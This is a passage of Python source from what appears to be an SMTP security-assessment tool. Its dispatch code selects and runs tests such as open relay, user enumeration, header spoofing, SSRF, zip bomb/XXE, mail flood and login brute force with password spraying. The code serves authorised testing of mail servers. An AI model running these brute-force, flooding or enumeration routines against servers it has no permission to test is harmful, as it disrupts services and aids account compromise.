        self.use_json = args.json
        self.ptjsonlib = ptjsonlib
        self.already_enumerated = None

        self.max_connections_is_error = None
        self.is_slow_down = None
        self.fqdn = "example.com" if not args.fqdn else args.fqdn

        # Load enumeration wordlist; keep only lines whose local part is valid (RFC 5322/6531)
        if args.wordlist:
            raw = list(filter(lambda x: x != "", text_or_file(None, args.wordlist)))
            self.wordlist = [u for u in raw if self._is_valid_local_part(u.split("@")[0].strip())]
            self._wordlist_skipped = len(raw) - len(self.wordlist)
        else:
            self.wordlist = None
            self._wordlist_skipped = 0

        # Default port number: 465 for implicit TLS (--tls), 587 for STARTTLS, 25 otherwise
        if args.target.port == 0:
            if args.tls:
                args.target.port = 465
            elif getattr(args, "starttls", False):
                args.target.port = 587
            else:
                args.target.port = 25
        self.target = args.target.ip
        self.port = args.target.port

        self.do_brute = check_if_brute(args)

        try:
            socket.inet_aton(self.target)
            self.target_is_ip = True
        except socket.error as e:
            self.target_is_ip = False
        if self.target_is_ip:
            self.target_ip = self.target
        else:
            try:
                self.target_ip = socket.gethostbyname(self.target)
            except socket.gaierror:
                raise argparse.ArgumentError(
                    None, f"Cannot resolve domain name '{self.target}' to IP address"
                )

        self.args = args
        self._brute_stream_lock = threading.Lock()
        self._streamed_ptr_domain = False
        self.results: SMTPResults

    def _is_run_all_mode(self) -> bool:
        """True when only target is given (no test switches). Run all tests in sequence."""
        return not (
            self.args.blacklist_test
            or self.args.spf_test
            or self.args.banner
            or self.args.commands
            or getattr(self.args, "authentications", False)
            or getattr(self.args, "auth_enum", False)
            or getattr(self.args, "auth_format", False)
            or getattr(self.args, "helo_validation", False)
            or getattr(self.args, "auth_downgrade", False)
            or getattr(self.args, "invalid_commands", False)
            or getattr(self.args, "helo_only", False)
            or getattr(self.args, "helo_bypass", False)
            or getattr(self.args, "identify", False)
            or getattr(self.args, "id_aggressive", False)
            or _bounce_replay_active(self.args)
            or getattr(self.args, "bomb", False)
            or getattr(self.args, "antivirus", False)
            or getattr(self.args, "ssrf", False)
            or getattr(self.args, "zipxxe", False)
            or getattr(self.args, "flood", False)
            or getattr(self.args, "spoof_headers", False)
            or getattr(self.args, "bcc_test", False)
            or getattr(self.args, "alias_test", False)
            or self.args.isencrypt
            or self.args.interactive
            or self.args.ntlm
            or self.args.open_relay
            or getattr(self.args, "role", False)
            or self.args.enumerate is not None
            or self.args.max_connections
            or getattr(self.args, "rcpt_limit", False)
            or self.do_brute
        )

    def _fail(self, msg: str) -> None:
        """In run-all mode: raise TestFailedError. Otherwise: end_error + SystemExit."""
        if self.run_all_mode:
            raise TestFailedError(msg)
        self.ptjsonlib.end_error(msg, self.use_json)
        raise SystemExit

    def run(self):
        self.results = SMTPResults()
        smtp = None
        self.run_all_mode = self._is_run_all_mode()

        if self.run_all_mode:
            self._run_all_tests()
            return

        # Indirect scanning (blacklist: domain + public IP; private IP skipped with message)
        if self.args.blacklist_test:
            self.ptprint("Blacklist information", Out.INFO)
            bl_result, skipped_private = self.test_blacklist(self.target)
            if skipped_private:
                self.results.blacklist_private_ip_skipped = True
            elif bl_result is not None:
                self.results.blacklist = bl_result
            self._stream_blacklist_result()

        if self.args.spf_test:
            self.ptprint("SPF records", Out.INFO)
            if self.target_is_ip:
                self.results.spf_requires_domain = True
            else:
                try:
                    self.results.spf_records = self._get_nameservers(self.target)
                except SystemExit:
                    raise
                except Exception as e:
                    self.ptjsonlib.end_error(f"Error during SPF test: {e}", self.use_json)
                    raise SystemExit
            self._stream_spf_result()

        # Direct scanning
        # Only -iv (invalid-commands): no banner needed, test connects itself
        only_invalid_commands = (
            getattr(self.args, "invalid_commands", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_invalid_commands:
            self.ptprint("Command Robustness Test", Out.INFO)
            try:
                self.results.inv_comm = self.test_invalid_commands()
                self._stream_inv_comm_result()
            except Exception as e:
                self.results.inv_comm_error = str(e)
                self._stream_inv_comm_result()
            return

        # Only -ho (helo-only): test if server supports EHLO extensions
        only_helo_only = (
            getattr(self.args, "helo_only", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
        )
        if only_helo_only:
            self.ptprint("HELO-only Test", Out.INFO)
            try:
                self.results.helo_only = self.test_helo_only()
                self._stream_helo_only_result()
            except Exception as e:
                self.results.helo_only_error = str(e)
                self._stream_helo_only_result()
            return

        # Only -hb (helo-bypass): test HELO/EHLO value for restriction bypass
        only_helo_bypass = (
            getattr(self.args, "helo_bypass", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
            and not getattr(self.args, "helo_only", False)
        )
        if only_helo_bypass:
            self.ptprint("HELO/EHLO Bypass Test", Out.INFO)
            try:
                self.results.helo_bypass = self.test_helo_bypass()
                self._stream_helo_bypass_result()
            except Exception as e:
                self.results.helo_bypass_error = str(e)
                self._stream_helo_bypass_result()
            return

        # Only -id / --id-aggressive: SMTP server software identification (--id-aggressive implies -id)
        only_identify = (
            (getattr(self.args, "identify", False) or getattr(self.args, "id_aggressive", False))
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
            and not getattr(self.args, "helo_only", False)
            and not getattr(self.args, "helo_bypass", False)
            and not getattr(self.args, "auth_format", False)
        )
        if only_identify:
            self.ptprint("Service Fingerprinting", Out.INFO)
            try:
                self.results.identify = self.test_server_identify()
                self._stream_identify_result()
            except Exception as e:
                self.results.identify_error = str(e)
                self._stream_identify_result()
            return

        # Only -br (bounce-replay): test if server sends bounces to MAIL FROM without validation
        only_bounce_replay = (
            _bounce_replay_active(self.args)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
            and not getattr(self.args, "helo_only", False)
            and not getattr(self.args, "helo_bypass", False)
        )
        if only_bounce_replay:
            self.ptprint("Bounce Replay Test", Out.INFO)
            try:
                self.results.bounce_replay = self.test_bounce_replay()
                self._stream_bounce_replay_result()
            except Exception as e:
                self.results.bounce_replay_error = str(e)
                self._stream_bounce_replay_result()
            return

        # -bomb / -av / -ssrf / -flood / -zipxxe (any combination; fixed order BOMB → … → ZIPXXE)
        ts_ordered_tests: list[str] = []
        if getattr(self.args, "bomb", False):
            ts_ordered_tests.append("BOMB")
        if getattr(self.args, "antivirus", False):
            ts_ordered_tests.append("ANTIVIRUS")
        if getattr(self.args, "ssrf", False):
            ts_ordered_tests.append("SSRF")
        if getattr(self.args, "flood", False):
            ts_ordered_tests.append("FLOOD")
        if getattr(self.args, "zipxxe", False):
            ts_ordered_tests.append("ZIPXXE")
        only_standalone_ts_tests = (
            len(ts_ordered_tests) > 0
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
            and not getattr(self.args, "helo_only", False)
            and not getattr(self.args, "helo_bypass", False)
            and not _bounce_replay_active(self.args)
        )
        if only_standalone_ts_tests:
            for test_name in ts_ordered_tests:
                if test_name == "BOMB":
                    self.ptprint("Mail Bomb / Rate Limiting Test", Out.INFO)
                    try:
                        self.results.mail_bomb = self.test_bomb()
                        self._stream_mail_bomb_result()
                    except Exception as e:
                        self.results.mail_bomb_error = str(e)
                        self._stream_mail_bomb_result()
                elif test_name == "ANTIVIRUS":
                    self.ptprint("Antivirus / Antispam Test", Out.INFO)
                    try:
                        self.results.antivirus = self.test_antivirus()
                        self._stream_antivirus_result()
                    except Exception as e:
                        self.results.antivirus_error = str(e)
                        self._stream_antivirus_result()
                elif test_name == "SSRF":
                    self.ptprint("SSRF Test – server fetches links in messages", Out.INFO)
                    try:
                        self.results.ssrf = self.test_ssrf()
                        self._stream_ssrf_result()
                    except Exception as e:
                        self.results.ssrf_error = str(e)
                        self._stream_ssrf_result()
                elif test_name == "FLOOD":
                    self.ptprint("Queue Flood Test", Out.INFO)
                    try:
                        self.results.flood = self.test_flood()
                        self._stream_flood_result()
                    except Exception as e:
                        self.results.flood_error = str(e)
                        self._stream_flood_result()
                elif test_name == "ZIPXXE":
                    self.ptprint("ZIPXXE Test – Zip Bomb, Billion Laughs, XXE", Out.INFO)
                    try:
                        self.results.zipxxe = self.test_zipxxe()
                        self._stream_zipxxe_result()
                    except Exception as e:
                        self.results.zipxxe_error = str(e)
                        self._stream_zipxxe_result()
            return

        # Standalone -sh: Header spoofing test
        only_spoof_headers = (
            getattr(self.args, "spoof_headers", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
            and not getattr(self.args, "helo_only", False)
            and not getattr(self.args, "helo_bypass", False)
            and not _bounce_replay_active(self.args)
            and not getattr(self.args, "bomb", False)
            and not getattr(self.args, "antivirus", False)
            and not getattr(self.args, "ssrf", False)
            and not getattr(self.args, "flood", False)
            and not getattr(self.args, "zipxxe", False)
            and not getattr(self.args, "bcc_test", False)
        )
        if only_spoof_headers:
            self.ptprint("Header Spoofing Test (From, Reply-To, Return-Path)", Out.INFO)
            try:
                self.results.spoof_header = self.test_spoof_headers()
                self._stream_spoof_header_result()
            except Exception as e:
                self.results.spoof_header_error = str(e)
                self._stream_spoof_header_result()
            return

        # Standalone -bcc: BCC disclosure test
        only_bcc_test = (
            getattr(self.args, "bcc_test", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
            and not getattr(self.args, "helo_only", False)
            and not getattr(self.args, "helo_bypass", False)
            and not _bounce_replay_active(self.args)
            and not getattr(self.args, "bomb", False)
            and not getattr(self.args, "antivirus", False)
            and not getattr(self.args, "ssrf", False)
            and not getattr(self.args, "flood", False)
            and not getattr(self.args, "zipxxe", False)
            and not getattr(self.args, "spoof_headers", False)
            and not getattr(self.args, "alias_test", False)
        )
        if only_bcc_test:
            self.ptprint("BCC Disclosure Test", Out.INFO)
            try:
                self.results.bcc_test = self.test_bcc()
                self._stream_bcc_result()
            except Exception as e:
                self.results.bcc_test_error = str(e)
                self._stream_bcc_result()
            return

        # Standalone -al: Alias & Addressing bypass test
        only_alias_test = (
            getattr(self.args, "alias_test", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
            and not getattr(self.args, "invalid_commands", False)
            and not getattr(self.args, "helo_only", False)
            and not getattr(self.args, "helo_bypass", False)
            and not _bounce_replay_active(self.args)
            and not getattr(self.args, "bomb", False)
            and not getattr(self.args, "antivirus", False)
            and not getattr(self.args, "ssrf", False)
            and not getattr(self.args, "flood", False)
            and not getattr(self.args, "zipxxe", False)
            and not getattr(self.args, "spoof_headers", False)
            and not getattr(self.args, "bcc_test", False)
        )
        if only_alias_test:
            self.ptprint("Alias & Addressing Bypass Test (PTL-SVC-SMTP-ALIAS)", Out.INFO)
            try:
                self.results.alias_test = self.test_alias()
                self._stream_alias_result()
            except Exception as e:
                self.results.alias_test_error = str(e)
                self._stream_alias_result()
            return

        # Only -ie: no need to connect; test_encryption() opens its own connections
        if (
            self.args.isencrypt
            and not self.args.interactive
            and not self.args.ntlm
            and not self.args.open_relay
            and self.args.enumerate is None
            and not self.args.max_connections
            and not self.do_brute
        ):
            if not self.use_json:
                self.ptprint("Encryption", Out.INFO)
            self.results.encryption = self.test_encryption()
            self._stream_encryption_result()
            return

        # Standalone role only: no banner, just connect, EHLO and identify role
        only_role = (
            getattr(self.args, "role", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_role:
            self.ptprint("Identified Role", Out.INFO)
            try:
                smtp, info = self.initial_info(get_commands=True)
                self.results.info = InfoResult(
                    info.banner,
                    info.ehlo,
                    getattr(info, "ehlo_starttls", None),
                )
                self.results.resolved_domain = self._get_domain_from_banner_or_ptr(self.results.info)
                self.results.banner_requested = False
                self.results.commands_requested = False
                self.results.role = self.test_role(smtp, info)
                self._stream_role_result()
            except TestFailedError as e:
                self.results.role_error = str(e)
                self._stream_role_result()
            except Exception as e:
                self.results.info_error = str(e)
                if not self.use_json:
                    self.ptprint(f"Error: {e}", Out.ERROR)
            return

        # Standalone enumeration only: no banner, no initial_info, just this test
        only_enumerate = (
            self.args.enumerate is not None
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_enumerate:
            self.ptprint("User Enumeration & Catch All mailbox", Out.INFO)
            try:
                smtp_enum, status, reply = self.connect()
                if status != 220:
                    raise Exception(self.bytes_to_str(reply) if reply else "Connect failed")
                banner = reply.decode()
                ehlo = None
                try:
                    _, ehlo_bytes = smtp_enum.ehlo(self.fqdn)
                    ehlo = ehlo_bytes.decode() if ehlo_bytes else None
                except Exception:
                    pass
                self.results.info = InfoResult(banner, ehlo, None)
                self.results.resolved_domain = self._get_domain_from_banner_or_ptr(self.results.info)
                self.results.banner_requested = False
                try:
                    self.results.catch_all = self.test_catchall(smtp_enum)
                except Exception:
                    self.results.catch_all = "indeterminate"
                self.results.enum_results = self.enumeration(smtp_enum)
                self._stream_enumeration_result()
            except Exception as e:
                self.results.info_error = str(e)
                if not self.use_json:
                    self.ptprint(f"Error: {e}", Out.ERROR)
            return

        # Standalone commands or authentications (EHLO): -A and -c are aliases, same test
        only_commands_or_auth = (
            (self.args.commands or getattr(self.args, "authentications", False))
            and not self.args.banner
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_commands_or_auth:
            try:
                smtp, info = self.initial_info(get_commands=True)
                self.results.info = InfoResult(
                    None,
                    info.ehlo,
                    getattr(info, "ehlo_starttls", None),
                )
                self.results.banner_requested = False
                self.results.commands_requested = True
                self.results.authentications_requested = getattr(self.args, "authentications", False)
                self._stream_ehlo_result()
            except Exception as e:
                self.results.info_error = str(e)
                if not self.use_json:
                    self.ptprint(f"Error: {e}", Out.ERROR)
            return

        # Standalone RCPT TO limit only: no banner, no other tests, just this test
        only_rcpt_limit = (
            getattr(self.args, "rcpt_limit", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not self.do_brute
        )
        if only_rcpt_limit:
            self.ptprint("RCPT TO limit", Out.INFO)
            try:
                # Populate results.info (banner + EHLO) so _get_rcpt_limit_domain() uses server hostname
                # like in run-all; we do not stream banner/ehlo to the user.
                _, info = self.initial_info(get_commands=True)
                self.results.info = InfoResult(
                    info.banner,
                    info.ehlo,
                    getattr(info, "ehlo_starttls", None),
                )
                self.results.resolved_domain = self._get_domain_from_banner_or_ptr(self.results.info)
                self.results.banner_requested = False
                self.results.commands_requested = False
                smtp_rc = self.get_smtp_handler()
                smtp_rc.docmd("EHLO", self.fqdn)
                self.results.rcpt_limit = self.test_rcpt_limit(smtp_rc)
                self._stream_rcpt_limit_result()
            except TestFailedError as e:
                self.results.rcpt_limit_error = str(e)
                self._stream_rcpt_limit_result()
            except Exception as e:
                self.results.info_error = str(e)
                if not self.use_json:
                    self.ptprint(f"Error: {e}", Out.ERROR)
            return

        # Standalone interactive only: no banner output, just connect and start CLI
        only_interactive = (
            self.args.interactive
            and not self.args.banner
            and not self.args.commands
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_interactive and not self.use_json:
            try:
                smtp, _ = self.initial_info(get_commands=False)
                self.start_interactive_mode(smtp)
            except Exception as e:
                self.results.info_error = str(e)
                if not self.use_json:
                    self.ptprint(f"Error: {e}", Out.ERROR)
            return

        # Standalone NTLM only: no banner output, just this test
        only_ntlm = (
            self.args.ntlm
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_ntlm:
            self.ptprint("NTLM information", Out.INFO)
            try:
                smtp, _ = self.initial_info(get_commands=False)
                self.results.ntlm = self.auth_ntlm(smtp)
                self._stream_ntlm_result()
            except Exception as e:
                self.results.info_error = str(e)
                if not self.use_json:
                    self.ptprint(f"Error: {e}", Out.ERROR)
            return

        # Standalone open relay only: no banner output, just this test
        only_open_relay = (
            self.args.open_relay
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_open_relay:
            self.ptprint("Open relay", Out.INFO)
            try:
                smtp, _ = self.initial_info(get_commands=False)
                mail_from = self.args.mail_from or f"relaytest@{self.fqdn}"
                rcpt_to = self.args.rcpt_to or "relaytest@external.relaytest.local"
                self.results.open_relay = self.open_relay_test(smtp, "TEST", mail_from, rcpt_to)
                self._stream_open_relay_result()
            except Exception as e:
                self.results.info_error = str(e)
                if not self.use_json:
                    self.ptprint(f"Error: {e}", Out.ERROR)
            return

        # Standalone max connections only: no banner, no initial_info, just this test
        only_max_connections = (
            self.args.max_connections
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_max_connections:
            self.ptprint("Connections", Out.INFO)
            try:
                self.results.max_connections = self.max_connections_test()
                self._stream_max_connections_result()
            except Exception as e:
                self.results.max_connections_error = str(e)
                self._stream_max_connections_result()
            return

        # Standalone AUTH LOGIN format probe only (PTL-SVC-SMTP-AUTH-FORMAT)
        only_auth_format = (
            getattr(self.args, "auth_format", False)
            and not getattr(self.args, "auth_enum", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_auth_format:
            self.ptprint("AUTH LOGIN format detection", Out.INFO)
            try:
                self.results.auth_format = self.test_auth_format_probe()
                self._stream_auth_format_result()
            except Exception as e:
                self.results.auth_format_error = str(e)
                self._stream_auth_format_result()
            return

        # Standalone AUTH user enumeration only
        only_auth_enum = (
            getattr(self.args, "auth_enum", False)
            and not getattr(self.args, "auth_format", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_auth_enum:
            self.ptprint("AUTH user enumeration", Out.INFO)
            try:
                self.results.auth_enum = self.test_auth_enum()
                self._stream_auth_enum_result()
            except Exception as e:
                self.results.auth_enum_error = str(e)
                self._stream_auth_enum_result()
            return

        # Standalone HELO/EHLO hostname validation only
        only_helo_validation = (
            getattr(self.args, "helo_validation", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_helo_validation:
            self.ptprint("HELO/EHLO hostname validation", Out.INFO)
            try:
                self.results.helo_validation = self.test_helo_validation()
                self._stream_helo_validation_result()
            except Exception as e:
                self.results.helo_validation_error = str(e)
                self._stream_helo_validation_result()
            return

        # Standalone AUTH downgrade only
        only_auth_downgrade = (
            getattr(self.args, "auth_downgrade", False)
            and not self.args.banner
            and not self.args.commands
            and not self.args.interactive
            and not self.args.isencrypt
            and not self.args.ntlm
            and not self.args.open_relay
            and not getattr(self.args, "role", False)
            and self.args.enumerate is None
            and not self.args.max_connections
            and not getattr(self.args, "rcpt_limit", False)
            and not self.do_brute
        )
        if only_auth_downgrade:
            self.ptprint("Authentication Downgrade Test", Out.INFO)
            try:
                self.results.auth_downgrade = self.test_auth_downgrade()
                self._stream_auth_downgrade_result()
            except Exception as e:
                self.results.auth_downgrade_error = str(e)
                self._stream_auth_downgrade_result()
            return

        # enter only if any of these arguments were explicitly specified
        need_info = (
            self.args.banner
            or self.args.commands
            or getattr(self.args, "authentications", False)
            or getattr(self.args, "auth_enum", False)
            or getattr(self.args, "auth_format", False)
            or getattr(self.args, "helo_validation", False)
            or getattr(self.args, "auth_downgrade", False)
            or getattr(self.args, "invalid_commands", False)
            or self.args.interactive
            or self.args.isencrypt
            or self.args.ntlm
            or self.args.open_relay
            or getattr(self.args, "role", False)
            or self.args.enumerate is not None
            or self.args.max_connections
            or getattr(self.args, "rcpt_limit", False)
            or self.do_brute
        )
        if need_info:
            do_banner = self.args.banner
            do_role = getattr(self.args, "role", False)
            do_commands = (
                self.args.commands
                or getattr(self.args, "authentications", False)
                or do_role
                or (self.args.enumerate is not None)
                or getattr(self.args, "helo_validation", False)
                or getattr(self.args, "auth_downgrade", False)
                or getattr(self.args, "invalid_commands", False)
                or (getattr(self.args, "rcpt_limit", False) and not getattr(self.args, "domain", None))
            )
            self.results.banner_requested = do_banner
            self.results.commands_requested = self.args.commands or getattr(self.args, "authentications", False)
            self.results.authentications_requested = getattr(self.args, "authentications", False)

            self.ptprint("Banner", Out.INFO)
            try:
                smtp, info = self.initial_info(get_commands=do_commands)
            except Exception as e:
                self.results.info_error = str(e)
                return
            self.results.info = InfoResult(
                info.banner if (do_banner or do_role) else None,
                info.ehlo if do_commands else None,
                getattr(info, "ehlo_starttls", None),
            )
            self.results.resolved_domain = self._get_domain_from_banner_or_ptr(self.results.info)
            self._stream_banner_result()
            if do_commands:
                self._stream_ehlo_result()

            if do_role:
                self.ptprint("Identified Role", Out.INFO)
                try:
                    self.results.role = self.test_role(smtp, info)
                except TestFailedError as e:
                    self.results.role_error = str(e)
                except Exception as e:
                    self.results.role_error = str(e)
                self._stream_role_result()

            if self.args.isencrypt:
                self.ptprint("Encryption", Out.INFO)
                self.results.encryption = self.test_encryption()
                self._stream_encryption_result()

            if self.args.interactive and not self.use_json:
                self.start_interactive_mode(smtp)

            if self.args.ntlm:
                self.ptprint("NTLM information", Out.INFO)
                self.results.ntlm = self.auth_ntlm(smtp)
                self._stream_ntlm_result()

            if getattr(self.args, "auth_format", False):
                self.ptprint("AUTH LOGIN format detection", Out.INFO)
                try:
                    self.results.auth_format = self.test_auth_format_probe()
                    self._stream_auth_format_result()
                except Exception as e:
                    self.results.auth_format_error = str(e)
                    self._stream_auth_format_result()

            if getattr(self.args, "auth_enum", False):
                self.ptprint("AUTH user enumeration", Out.INFO)
                try:
                    self.results.auth_enum = self.test_auth_enum()
                    self._stream_auth_enum_result()
                except Exception as e:
                    self.results.auth_enum_error = str(e)
                    self._stream_auth_enum_result()

            if getattr(self.args, "helo_validation", False):
                self.ptprint("HELO/EHLO hostname validation", Out.INFO)
                try:
                    self.results.helo_validation = self.test_helo_validation()
                    self._stream_helo_validation_result()
                except Exception as e:
                    self.results.helo_validation_error = str(e)
                    self._stream_helo_validation_result()

            if getattr(self.args, "auth_downgrade", False):
                self.ptprint("Authentication Downgrade Test", Out.INFO)
                try:
                    self.results.auth_downgrade = self.test_auth_downgrade()
                    self._stream_auth_downgrade_result()
                except Exception as e:
                    self.results.auth_downgrade_error = str(e)
                    self._stream_auth_downgrade_result()

            if getattr(self.args, "invalid_commands", False):
                self.ptprint("Command Robustness Test", Out.INFO)
                try:
                    self.results.inv_comm = self.test_invalid_commands()
                    self._stream_inv_comm_result()
                except Exception as e:
                    self.results.inv_comm_error = str(e)
                    self._stream_inv_comm_result()

            if getattr(self.args, "helo_bypass", False):
                self.ptprint("HELO/EHLO Bypass Test", Out.INFO)
                try:
                    self.results.helo_bypass = self.test_helo_bypass()
                    self._stream_helo_bypass_result()
                except Exception as e:
                    self.results.helo_bypass_error = str(e)
                    self._stream_helo_bypass_result()

            if self.args.open_relay:
                self.ptprint("Open relay", Out.INFO)
                self.results.open_relay = self.open_relay_test(
                    smtp, "TEST", self.args.mail_from, self.args.rcpt_to
                )
                self._stream_open_relay_result()

            if self.args.enumerate is not None:
                self.ptprint("User Enumeration & Catch All mailbox", Out.INFO)
                smtp_enum = self.get_smtp_handler()
                smtp_enum.docmd("EHLO", self.fqdn)
                try:
                    self.results.catch_all = self.test_catchall(smtp_enum)
                except Exception:
                    self.results.catch_all = "indeterminate"
                self.results.enum_results = self.enumeration(smtp_enum)
                self._stream_enumeration_result()

            if self.args.max_connections:
                self.ptprint("Connections", Out.INFO)
                self.results.max_connections = self.max_connections_test()
                self._stream_max_connections_result()

            if getattr(self.args, "rcpt_limit", False):
                self.ptprint("RCPT TO limit", Out.INFO)
                try:
                    smtp_rc = self.get_smtp_handler()
                    smtp_rc.docmd("EHLO", self.fqdn)
                    self.results.rcpt_limit = self.test_rcpt_limit(smtp_rc)
                except TestFailedError as e:
                    self.results.rcpt_limit_error = str(e)
                except Exception as e:
                    self.results.rcpt_limit_error = str(e)
                self._stream_rcpt_limit_result()

            if self.do_brute:
                self.ptprint("Login bruteforce", Out.INFO)
                self.results.creds = simple_bruteforce(
                    self._try_login,
                    self.args.user,
                    self.args.users,
                    self.args.password,
                    self.args.passwords,
                    self.args.spray,
                    self.args.threads,
                    on_success=self._on_brute_success if not self.use_json else None,
                )
                self._stream_brute_result()

    def _run_all_tests(self) -> None:
        """Run all tests in sequence. On failure: print error, continue with next.

        Excluded from run-all (use flags explicitly):
        - max_connections: opens many connections, triggers rate limits (421).
        - invalid_commands (-iv): high server load (fuzzing, long inputs, many connections).
          Use -iv flag explicitly if needed.
        """
        # 1. Banner + commands (plaintext connection, EHLO)
        self.results.banner_requested = True
        self.results.commands_requested = True
        self.ptprint("Banner", Out.INFO)
        try:
            smtp, info = self.initial_info(get_commands=True)
            self.results.info = info
        except TestFailedError as e:
            self.results.info_error = str(e)
            return
        except Exception as e:
            self.results.info_error = str(e)
            return
        self.results.resolved_domain = self._get_domain_from_banner_or_ptr(self.results.info)
        self._stream_banner_result()

        # Role identification (uses banner/EHLO data already collected)
        self.ptprint("Identified Role", Out.INFO)
        try:
            self.results.role = self.test_role(smtp, info)
        except TestFailedError as e:
            self.results.role_error = str(e)
        except Exception as e:
            self.results.role_error = str(e)
        self._stream_role_result()

        self._stream_ptr_domain()
        self._stream_ehlo_result()
        # 2. Encryption: on port 465 we connected via TLS, so set tls_ok=True.
        #    With --starttls we already upgraded, so starttls_ok=True (EHLO may omit STARTTLS after upgrade).
        #    On other ports: STARTTLS from EHLO if present.
        #    Full test_encryption() (all three modes) only with -ie flag.
        if self.args.target.port == 465:
            self.results.encryption = EncryptionResult(
                plaintext_ok=False, starttls_ok=False, tls_ok=True
            )
        elif self.args.starttls or (info.ehlo and "STARTTLS" in info.ehlo.upper()):
            self.results.encryption = EncryptionResult(
                plaintext_ok=True, starttls_ok=True, tls_ok=False
            )
        else:
            self.results.encryption = EncryptionResult(
